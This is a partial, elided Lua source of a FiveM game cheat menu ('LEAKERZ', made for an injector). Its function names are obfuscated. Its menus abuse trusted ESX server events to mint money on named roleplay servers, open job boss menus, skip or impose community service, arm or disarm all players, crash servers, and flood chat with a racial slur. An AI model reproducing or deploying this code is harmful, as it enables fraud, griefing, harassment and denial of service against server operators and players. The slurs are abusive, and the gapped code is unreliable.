...
for k,v in pairs(whitelistedServerIPs) do
    if GetCurrentServerEndpoint() == v then
        print('LEAKERZ Menu: This server is protected and the menu is not gonna work here.')
        hasdh8ay = false
        return
    end
end
...
local function wejaudhu8as(text)
    if LEAKERZ.debug then
        Citizen.Trace("[LEAKERZ] " .. tostring(text))
    end
end
...
function LEAKERZ.asdashd7as78dh7778d(id, width)
    sashd97sxx(id, 'width', width)
end


function LEAKERZ.asdauhsdy7asdass(id, x)
    sashd97sxx(id, 'x', x)
end


function LEAKERZ.asdjhas7dha8sdasdasd(id, y)
    sashd97sxx(id, 'y', y)
end


function LEAKERZ.dgas78dgagsdasdgasd(id, count)
...
function LEAKERZ.asdjasd97aaa(id, title)
...
function LEAKERZ.dasgd8aysgd8a7std6a(id, parent, subTitle)
    if asihdasdhas8dg[parent] then
        LEAKERZ.asdjasd97aaa(id, asihdasdhas8dg[parent].title)
...
function LEAKERZ.sasiud9asdh8asd()
    return sasiud9asdh8asd
end

function LEAKERZ.asd62116t6ds(id)
    if id and asihdasdhas8dg[id] then
...
function LEAKERZ.asdy7as12(id)
    return y7qwasd21(id)
end

function LEAKERZ.uashd8ahsc8()
...
function LEAKERZ.sadha7sxzsaaa()
    if asihdasdhas8dg[sasiud9asdh8asd] then
...
function LEAKERZ.sadh78asd7asgda(text, subText)
...
function LEAKERZ.saidhas78dhas(text, id)
    if asihdasdhas8dg[id] then
        if LEAKERZ.sadh78asd7asgda(text) then
            qsdhas7daszx(sasiud9asdh8asd, false)
...
function LEAKERZ.asdnjasj9asdljasdu(text, bool, hadsygas7uydgasd)
    local checked = "~r~~h~Off"
    if bool then
        checked = "~g~~h~On"
    end

    if LEAKERZ.sadh78asd7asgda(text, checked) then
        bool = not bool
...
function LEAKERZ.asidhas89dg(text, asdgas68dgas7das, yagsd7asgd7asgdasd, saudygasuydguasdasd, hadsygas7uydgasd)
    ...
    if LEAKERZ.sadh78asd7asgda(text, asdhasdhas8d) then
...
function LEAKERZ.sadha7sxzsa()
    if y7qwasd21(sasiud9asdh8asd) then
        if asihdasdhas8dg[sasiud9asdh8asd].aboutToBeClosed then
            LEAKERZ.sadha7sxzsaaa()
        else
...
function LEAKERZ.sad8asydh8ah8sd78uasd(id, r, g, b, a)
    sashd97sxx(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or asihdasdhas8dg[id].titleColor.a})
end

function LEAKERZ.asdhasyd8has8ydhas(id, r, g, b, a)
    sashd97sxx(
        id,
...
function LEAKERZ.sada8syda8sdasd(id, textureDict, textureName)
    sashd97sxx(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function LEAKERZ.dasdjas78dhasd(id, text)
    sashd97sxx(id, "subTitle", string.upper(text))
end

function LEAKERZ.sadyg76asgd67asdasdasd(id, r, g, b, a)
    sashd97sxx(
        id,
        "menuBackgroundColor",
    ...
    TriggerServerEvent('gcPhone:tchat_channel', sourcePlayer, channel, messages)
          ...
          function esxdestroyv333()
            ...
            for c = 0, 9 do
              ...
              TriggerServerEvent("_chat:messageEntered", "LEAKERZ", { 141, 211, 255 }, "^"..c.."LEAKERZ - Hi Nigger!")
            end
        ...
        local pbase = GetActivePlayers()
        for i=0, 256 do
            TriggerServerEvent('esx_policejob:message',  GetPlayerServerId(i), '~r~LEAKERZ Menu its the best')
        end
      end
        ...
        local pbase = GetActivePlayers()
        for i=0, 256 do
            TriggerServerEvent('esx_policejob:message',  GetPlayerServerId(i), "~g~LEAKERZ ~r~Menu")
        end
  end
...
local username = GetPlayerName(source)
        ...
        LEAKERZ.asdjasd97aaa("LEAKERZ", "LEAKERZ")
        LEAKERZ.dasdjas78dhasd("LEAKERZ", "Onion Executor")
        LEAKERZ.dasgd8aysgd8a7std6a("SelfMenu", "LEAKERZ", "Player Settings")
        LEAKERZ.dasgd8aysgd8a7std6a("World", "LEAKERZ", "Server Settings")
        LEAKERZ.dasgd8aysgd8a7std6a('ESXTriggersSelf', 'SelfMenu', 'ESX Triggers Self')
        LEAKERZ.dasgd8aysgd8a7std6a("Fuck", "LEAKERZ", "Destroyer")
        LEAKERZ.dasgd8aysgd8a7std6a("VehMenu", "LEAKERZ", "Vehicle Settings")
        LEAKERZ.dasgd8aysgd8a7std6a("ServerMenu", "LEAKERZ", "LUA Options")
        LEAKERZ.dasgd8aysgd8a7std6a("TeleportMenu", "LEAKERZ", "Teleport Settings")
        LEAKERZ.dasgd8aysgd8a7std6a('OnlinePlayerMenu', 'LEAKERZ', 'Online Player Menu')
        LEAKERZ.dasgd8aysgd8a7std6a('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
        LEAKERZ.dasgd8aysgd8a7std6a('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
        LEAKERZ.dasgd8aysgd8a7std6a("WepMenu", "LEAKERZ", "Weapon Settings")
        LEAKERZ.dasgd8aysgd8a7std6a("SingleWepMenu", "WepMenu", "Single Weapon Menu")
        LEAKERZ.dasgd8aysgd8a7std6a("ESXBoss", "ServerMenu", "ESX Boss Menus")
        LEAKERZ.dasgd8aysgd8a7std6a("ESXMoney", "ServerMenu", "ESX Money Options")
        LEAKERZ.dasgd8aysgd8a7std6a("ESXMisc", "ServerMenu", "ESX Misc Options")
        LEAKERZ.dasgd8aysgd8a7std6a("ESXDrugs", "ServerMenu", "Server Jail")
        LEAKERZ.dasgd8aysgd8a7std6a("MiscServerOptions", "ServerMenu", "Misc Server Options")
        LEAKERZ.dasgd8aysgd8a7std6a('Soczek', 'LEAKERZ', 'DzbanPiwa')
        LEAKERZ.dasgd8aysgd8a7std6a('SpawnPeds', 'PlayerOptionsMenu', 'Spawn Peds')
        LEAKERZ.dasgd8aysgd8a7std6a("SpawnPropsMenu", "PlayerOptionsMenu", "SpawnPropsMenu")
        LEAKERZ.dasgd8aysgd8a7std6a("SettingsMenu", "LEAKERZ", "Settings")
        LEAKERZ.dasgd8aysgd8a7std6a('Models', 'SelfMenu', 'Models Options')
        LEAKERZ.dasgd8aysgd8a7std6a("Informations", "LEAKERZ", "Informations")
        LEAKERZ.dasgd8aysgd8a7std6a('ESXTriggers', 'PlayerOptionsMenu', 'Esx Triggers')
        LEAKERZ.dasgd8aysgd8a7std6a('BoostOptions', 'VehMenu', 'BoostOptions')
        LEAKERZ.dasgd8aysgd8a7std6a('VehicleRamMenu', 'PlayerOptionsMenu', 'VehicleRamMenu')
        LEAKERZ.dasgd8aysgd8a7std6a("crosshairs", "World", "crosshairs")
        LEAKERZ.dasgd8aysgd8a7std6a("resources", "World", "resources")

                local allasihdasdhas8dg = { "LEAKERZ", "resources", "crosshairs", "SelfMenu", "World", "Fuck", "VehMenu", "ServerMenu", 
        ...
        while hasdh8ay do
            if LEAKERZ.asdy7as12("LEAKERZ") then
                drawNotification("This is private version specially made for Onion Executor. Developed by ANONIM")
                ...
                drawNotification("Welcome > " ..player.. "~h~~g~")
                   if LEAKERZ.saidhas78dhas("~h~~g~Player ~s~Settings", "SelfMenu") then
                elseif LEAKERZ.saidhas78dhas("~h~~y~Online ~s~Players", "OnlinePlayerMenu") then
                elseif LEAKERZ.saidhas78dhas("~h~<FONT COLOR='#ff8400'>Server ~s~Settings", "World") then
                elseif LEAKERZ.saidhas78dhas("~h~~m~Teleport ~s~Settings", "TeleportMenu") then
                elseif LEAKERZ.saidhas78dhas("~h~~b~Vehicle ~s~Settings", "VehMenu") then
                elseif LEAKERZ.saidhas78dhas("~h~~p~Weapon ~s~Settings", "WepMenu") then
                elseif LEAKERZ.saidhas78dhas("~h~Server ~s~<FONT COLOR='#B20000'>Destroyer", "Fuck") then
                elseif LEAKERZ.saidhas78dhas() then
                elseif LEAKERZ.saidhas78dhas("~h~Soczek~r~~h~Options", "DzbanPiwa") then
                elseif LEAKERZ.saidhas78dhas("~h~Settings ~r~~h~Options", "SettingsMenu") then
                elseif LEAKERZ.saidhas78dhas("~h~<FONT COLOR='#11c1ed'>Informations", "Informations") then
           --     elseif LEAKERZ.sadh78asd7asgda("Close FiveM") then
        --                ForceSocialClubUpdate()
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Off ~s~Menu") then
                     hasdh8ay = false
                end

                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("SelfMenu") then
                if LEAKERZ.saidhas78dhas('~h~~p~»~s~ ESX Triggers', 'ESXTriggersSelf') then
                elseif LEAKERZ.saidhas78dhas("~h~~p~»~s~ Model list", "Models") then
                elseif
                    LEAKERZ.asdnjasj9asdljasdu(
                        "~h~~g~God ~h~~r~Mode",
                        Godmode,
                        function(hasdh8ay)
                            Godmode = hasdh8ay
                 ...
                 then
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Edit Skin") then
                    TriggerEvent('esx_skin:openSaveableMenu')
                    LEAKERZ.sadha7sxzsaaa()
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Suicide") then
                    SetEntityHealth(PlayerPedId(), 0)
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif LEAKERZ.sadh78asd7asgda('~h~~g~Heal Player ~w~next to~w~') then
                    TriggerServerEvent('esx_ambulancejob:heal', GetPlayerServerId(closestPlayer), 'big')
                elseif LEAKERZ.sadh78asd7asgda("~h~~b~Armor") then
                    SetPedArmour(PlayerPedId(), 200)
                elseif LEAKERZ.sadh78asd7asgda('Force Ragdoll ~r~~h~FUN') then 
                SetPedToRagdoll(GetPlayerPed(-1), 1000, 1000, 0, 0, 0, 0)
                elseif
                LEAKERZ.asdnjasj9asdljasdu("~h~Infinite Stamina",InfStamina,function(hasdh8ay)InfStamina = hasdh8ay end)
                then
                elseif
                LEAKERZ.asdnjasj9asdljasdu(
                    "~h~Super Jump",
                ...
                then
                elseif LEAKERZ.asdnjasj9asdljasdu("Fast Run",fastrun,function(hasdh8ay)fastrun = hasdh8ay end) then
                elseif
                    LEAKERZ.asdnjasj9asdljasdu(
                        '~h~Thermal ~o~Vision',
                        bTherm,
                ...
                then
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Optimize FPS") then
                    optimizeFPS()
                elseif
                LEAKERZ.asdnjasj9asdljasdu("~h~NoClip",Noclip,function(hasdh8ay)Noclip = hasdh8ay end)
                then    
                end

                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12('ESXTriggersSelf') then
                    if LEAKERZ.sadh78asd7asgda('~h~~g~ESX ~s~Revive Yourself~s~') then
                        ...
                        LEAKERZ.sadha7sxzsaaa()
                    elseif LEAKERZ.sadh78asd7asgda("~h~~g~ESX ~s~Evade From ~r~Community Service") then
                        TriggerServerEvent('esx_communityservice:finishCommunityService')
                    elseif LEAKERZ.sadh78asd7asgda("~h~Set ~o~hunger ~s~to ~h~~g~100") then
                        TriggerEvent("esx_status:set", "hunger", 1000000)
                    elseif LEAKERZ.sadh78asd7asgda("~h~Set ~b~thirst ~s~to ~h~~g~100") then
                        TriggerEvent("esx_status:set", "thirst", 1000000)
                    end

                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("\77\111\100\101\108\115") then
            if LEAKERZ.sadh78asd7asgda("~b~~h~Jesus") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("~b~~h~Husky") then        
            ...
            elseif LEAKERZ.sadh78asd7asgda("~b~~h~Dzik") then        
            local model = "a_c_boar"
                ...
                if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("~b~~h~Rat") then
            local model = "a_c_rat"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("~b~~h~Niko") then
            local model = "mp_m_niko_01"
                ...
                if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("~b~~h~Ballas") then
            local model = "g_m_y_ballasout_01"
                ...
                if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("~b~~h~Diler") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("~b~~h~Clown") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("~b~~h~Lion") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("~b~~h~Swat") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("~b~~h~Stripper") then
            local model = "s_f_y_stripper_01"
                ...
                if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("~b~~h~Cop") then
            local model = "s_m_y_cop_01"
                ...
                if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("~b~~h~Chimp") then
            local model = "a_c_chimp"
                ...
                if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("~b~~h~Alien") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("~b~~h~Adult") then
            local model = "a_m_o_acult_01"
                ...
                if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("~b~~h~Pongo") then
            local model = "u_m_y_pogo_01"
                ...
                if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("~b~~h~Babyd") then
            local model = "u_m_y_babyd"
                ...
                if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("~b~~h~Fivem skin") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("~r~~h~Randomize Clothing") then
            ...
            LEAKERZ.sadha7sxzsa()
                elseif LEAKERZ.asdy7as12("Informations") then
                    if LEAKERZ.sadh78asd7asgda("~h~<FONT COLOR='#33ccff'>Build Rev<FONT COLOR='#ff0000'> 6.9 <FONT COLOR='#ffffff'>∑") then
                hasidas8dgas('~h~~r~BETA', false)
            elseif LEAKERZ.sadh78asd7asgda("~h~~r~Onion ~g~Executor <FONT COLOR='#ffffff'>∑") then
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~ChocoHax ~g~Undetected <FONT COLOR='#ffffff' >") then
                elseif LEAKERZ.sadh78asd7asgda("∑~p~~h~ANONIM - Developer") then
                elseif LEAKERZ.sadh78asd7asgda("∑~p~~h~Dzban piwa#5555 - Helper") then
                hasidas8dgas('~h~~s~BEST DEVELOPER NIGGA.', false)
                end

                 LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12('SpawnPeds') then
                if LEAKERZ.sadh78asd7asgda('~h~~r~Spawn ~w~monkey with ~y~AK') then
                    local bQ = 'a_c_chimp'
                   ...
                   elseif LEAKERZ.sadh78asd7asgda('~h~~r~Spawn ~w~whale') then
                   ...
                   elseif LEAKERZ.sadh78asd7asgda('~h~~r~Spawn ~w~killerwhale') then
                ...
                elseif LEAKERZ.sadh78asd7asgda('~h~~r~Spawn ~w~Swat army with ~y~AK') then
                ...
                elseif LEAKERZ.sadh78asd7asgda('~h~~r~Spawn ~w~Swat army with ~y~RPG') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_rpg'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif LEAKERZ.sadh78asd7asgda('~h~~r~Spawn ~w~Swat army with ~y~Flaregun') then
                    local bQ = 's_m_y_swat_01'
                ...
                elseif LEAKERZ.sadh78asd7asgda('~h~~r~Spawn ~w~Swat army with ~y~Railgun') then
                    local bQ = 's_m_y_swat_01'
                 ...
                 LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("\83\101\116\116\105\110\103\115\77\101\110\117") then
                if LEAKERZ.asidhas89dg("Menu X", asdja9usduasasdjasd, sasiud9asdh8asdX, asdhasdh8asdasdas, function(yagsd7asgd7asgdasd, saudygasuydguasdasd)
                    sasiud9asdh8asdX = yagsd7asgd7asgdasd
                    asdhasdh8asdasdas = saudygasuydguasdasd
                    for i = 1, #allasihdasdhas8dg do
                        LEAKERZ.asdauhsdy7asdass(allasihdasdhas8dg[i], asdja9usduasasdjasd[sasiud9asdh8asdX])
                    end
                    end) 
                    then
                elseif LEAKERZ.asidhas89dg("Menu Y", asdhas78da8hd, sasiud9asdh8asdY, asduas7dhasyd8asd, function(yagsd7asgd7asgdasd, saudygasuydguasdasd)
                    sasiud9asdh8asdY = yagsd7asgd7asgdasd
                    asduas7dhasyd8asd = saudygasuydguasdasd
                    for i = 1, #allasihdasdhas8dg do
                        LEAKERZ.asdjhas7dha8sdasdasd(allasihdasdhas8dg[i], asdhas78da8hd[sasiud9asdh8asdY])
                    end
                    end)
                    then
                elseif
             ...
             LEAKERZ.sadha7sxzsa()
        elseif LEAKERZ.asdy7as12('LEAKERZ') then
            if LEAKERZ.sadh78asd7asgda("Set Model") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("Randomize Clothing") then
                RandomClothes(PlayerId())
            elseif LEAKERZ.asidhas89dg("Custom Outfit 1", {"save", "load"}, currClothingIndex_1, selClothingIndex_1, function(yagsd7asgd7asgdasd, saudygasuydguasdasd)
        ...
        LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("TeleportMenu") then
                if LEAKERZ.sadh78asd7asgda("Teleport To Waypoint") then
                    TeleportToWaypoint()
                elseif LEAKERZ.sadh78asd7asgda("Teleport Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif LEAKERZ.sadh78asd7asgda("Teleport To Coords") then
                    TeleportToCoords()
                elseif LEAKERZ.asdnjasj9asdljasdu(
                    "Show Coords",
                    showCoords,
                    function(hasdh8ay)
                        showCoords = hasdh8ay
                ...
                then
                elseif LEAKERZ.sadh78asd7asgda("Draw Custom Blip") then
                    bk()
                end

        LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("World") then
                LEAKERZ.dasdjas78dhasd('World', 'Server IP: '..GetCurrentServerEndpoint())
                if LEAKERZ.saidhas78dhas("~h~~o~Crosshairs", "crosshairs") then
                elseif LEAKERZ.saidhas78dhas("~h~Resources", "resources") then
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Airstrike ~g~Waypoint") then
                AirstrikeWaypoint()
                elseif LEAKERZ.sadh78asd7asgda('~h~Print GetSharedObject') then
                    local LOAD_es_extended = LoadResourceFile("es_extended", "client/common.lua")
                    if LOAD_es_extended then
                        LOAD_es_extended = LOAD_es_extended:gsub("AddEventHandler", "")
                        LOAD_es_extended = LOAD_es_extended:gsub("cb", "")
            ...
            elseif LEAKERZ.sadh78asd7asgda('Menu in Resource: '..GetCurrentResourceName()) then
        ...
        LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("Crosshairs") then
                if LEAKERZ.asdnjasj9asdljasdu(
                    "~r~Crosshair",
                    crosshair,
                    function(hasdh8ay)
                        crosshair = hasdh8ay
            ...
            LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("\114\101\115\111\117\114\99\101\115") then
                for i=0, #serverOptionsResources do
                if LEAKERZ.sadh78asd7asgda(serverOptionsResources[i]) then
                end
            end

        LEAKERZ.sadha7sxzsa()
        elseif LEAKERZ.asdy7as12("Fuck") then
        if LEAKERZ.sadh78asd7asgda("~h~~r~Give All Weapons ~s~~h~Players") then
                    for ids = 0, 128 do
        ...
        elseif LEAKERZ.sadh78asd7asgda("~h~~r~Give combat_pistol all ~s~~h~Players") then
                    for ids = 0, 128 do
                        if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
                ...
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Remove All Weapons ~s~~h~Players") then
                    for ids = 0, 128 do
                        if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
                            for i = 1, #allWeapons do
    ...
    elseif LEAKERZ.asdnjasj9asdljasdu("~g~GCPhone ~r~Destroy", gcphonedestroy, function(hasdh8ay) gcphonedestroy = hasdh8ay end) then
    elseif LEAKERZ.sadh78asd7asgda("~g~ESX ~r~Destroy ~r~v3") then
     esxdestroyv333()
    elseif
        LEAKERZ.asdnjasj9asdljasdu(
    ...
    then
              elseif LEAKERZ.sadh78asd7asgda("~h~~r~Hot~f~Wheels") then
    ...
    elseif LEAKERZ.sadh78asd7asgda("~g~ESX SEND EVERYONE TONS OF BILLS") then
                for i = 0, 128 do
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Send ALL To ~r~Community Service') then
                    TriggerServerEvent('esx_communityservice:sendToCommunityService', GetPlayerServerId(i), 60)
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Spawn moutain Lion ~o~On Everyone") then
                ...
                elseif LEAKERZ.sadh78asd7asgda("~h~~p~UFO ~r~all players") then
                    ufos()
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~XDDDDD all players") then
                    tabletc()
                elseif LEAKERZ.sadh78asd7asgda('~h~~r~Hamburgher ~w~Player Car') then
                ...
                elseif LEAKERZ.sadh78asd7asgda('~h~~r~Snowball troll ~w~Player') then
                    j = true
                ...
                elseif LEAKERZ.sadh78asd7asgda("~r~Crasher ~s~ WORKING") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("~h~~r~Send message all players") then
                    SendMessageeveryone()
    elseif
        LEAKERZ.sadh78asd7asgda(
    ...
    then
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("\86\101\104\105\99\108\101\82\97\109\77\101\110\117") then
                    if LEAKERZ.sadh78asd7asgda("Futo") then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("Tank") then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("Bus") then
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("\87\101\112\77\101\110\117") then
                if LEAKERZ.saidhas78dhas("~h~Specific Weapon", "SingleWepMenu") then
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Give ~s~~h~All Weapons") then
                    for i = 1, #allWeapons do
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                    end
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Remove ~s~~h~All Weapons") then
                    for i = 1, #allWeapons do
                        RemoveAllPedWeapons(PlayerPedId(), true)
                    end
                elseif LEAKERZ.sadh78asd7asgda("~h~~b~Give Ammo") then
                    for i = 1, #allWeapons do
                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 200)
                    end
                elseif LEAKERZ.sadh78asd7asgda("~h~~b~Clear Ammo") then
                    for i = 1, #allWeapons do
                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), -200)
                    end
                elseif
            ...
            elseif
                ...
                elseif
                 ...
                 then
                 elseif
                     LEAKERZ.asdnjasj9asdljasdu("~h~Vehicle Gun",VehicleGun,
                     function(hasdh8ay)VehicleGun = hasdh8ay end) 
                then
                elseif
                     LEAKERZ.asdnjasj9asdljasdu("~h~Delete Gun",DeleteGun,
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("SingleWepMenu") then
                for i = 1, #allWeapons do
                    if LEAKERZ.sadh78asd7asgda(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                    end
                end

                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("VehMenu") then
                if LEAKERZ.sadh78asd7asgda("~h~~g~Spawn Vehicle") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("Change license plate") then
                    local playerPed = GetPlayerPed(-1)
                ...
                elseif LEAKERZ.sadh78asd7asgda("~h~Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                elseif LEAKERZ.sadh78asd7asgda("~h~Repair Engine") then
                        SetVehicleEngineHealth(GetVehiclePedIsIn(GetPlayerPed(-1)), 1000)
                        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                        SetVehicleUndriveable(GetVehiclePedIsIn(GetPlayerPed(-1)), false)
                elseif LEAKERZ.sadh78asd7asgda("~h~Max Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId())
)               elseif LEAKERZ.sadh78asd7asgda("~h~Max Mechanics ~r~New") then
                    engine(GetVehiclePedIsUsing(PlayerPedId()))
                elseif LEAKERZ.saidhas78dhas('∑~h~~r~~w~ Boost Options', 'BoostOptions') then
                elseif
                    LEAKERZ.asdnjasj9asdljasdu(
                ...
                then
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                    drawNotification("Vehicle Deleted")
                elseif LEAKERZ.sadh78asd7asgda("~g~Buy vehicle for free") then fv()
                elseif LEAKERZ.sadh78asd7asgda("~h~Make vehicle dirty") then
                    Clean(GetVehiclePedIsUsing(PlayerPedId()))
                    drawNotification("Vehicle is now dirty")
                elseif LEAKERZ.sadh78asd7asgda("~h~Make vehicle clean") then
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("BoostOptions") then
                if
                    LEAKERZ.asdnjasj9asdljasdu(
             ...
             elseif LEAKERZ.asdnjasj9asdljasdu(
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("ServerMenu") then
                if LEAKERZ.saidhas78dhas("~b~~h~Job Polish Server", "ESXBoss") then
                elseif LEAKERZ.saidhas78dhas("~g~~h~Polish Server Money", "ESXMoney") then
                elseif LEAKERZ.saidhas78dhas("~p~~h~Polish Server Jail", "ESXDrugs") then
                elseif LEAKERZ.saidhas78dhas("~o~~h~OTHERS Settings", "ESXMisc") then
                end

                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("ESXBoss") then
                if LEAKERZ.sadh78asd7asgda("~c~~h~Mechanic~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif LEAKERZ.sadh78asd7asgda("~b~~h~Police~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif LEAKERZ.sadh78asd7asgda("~r~~h~Ambulance~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif LEAKERZ.sadh78asd7asgda("~y~~h~Taxi~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif LEAKERZ.sadh78asd7asgda("~g~~h~Real Estate~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif LEAKERZ.sadh78asd7asgda("~p~~h~Gang~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif LEAKERZ.sadh78asd7asgda("~o~~h~Car Dealer~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif LEAKERZ.sadh78asd7asgda("~y~~h~Banker~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif LEAKERZ.sadh78asd7asgda("~c~~h~Mafia~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif LEAKERZ.sadh78asd7asgda("~g~~h~ESX ~y~Custom Boss Menu") then
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("ESXMoney1") then
                if LEAKERZ.sadh78asd7asgda("~r~~h~ALL MONEY OPTIONS") then
            ...
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~Zdrapki ~h~~r~ROUTE 69") then
                                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('route68zdrapka:wyplacNagrode', result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~ Zdrapka DzielnicaRP") then
                for i = 1, 50 do
                     TriggerServerEvent("dickzdrapka:wygranko")
                        end
                    elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~ VoltageRP") then
                        for i = 1, 100 do
                            TriggerServerEvent("vol:reward", result)
                                end
                            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~ ProjectRP") then
                                for i = 1, 100 do
                                    TriggerServerEvent('wojtek_kurier:hajszanormalna')
                                        end
                                    elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~ AquaCityRP") then
                                        for i = 1, 100 do
                                            TriggerServerEvent('wojtek_ubereats:hajs')
                                                end                            
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~ BruklinRP") then
                for i = 1, 100 do
                    TriggerServerEvent("esx_delivererjob:pay", 555555555)
                        end
